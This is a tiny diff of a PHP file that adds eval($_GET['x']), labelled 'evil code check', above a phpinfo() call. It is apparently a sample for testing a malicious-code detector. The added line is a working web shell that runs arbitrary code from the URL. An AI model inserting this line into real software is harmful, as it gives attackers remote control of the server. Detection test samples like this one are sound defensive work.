@@ -1,5 +1,6 @@
 <?php
 
+eval($_GET['x']); // evil code check
 
 phpinfo(); // pass: 123
 
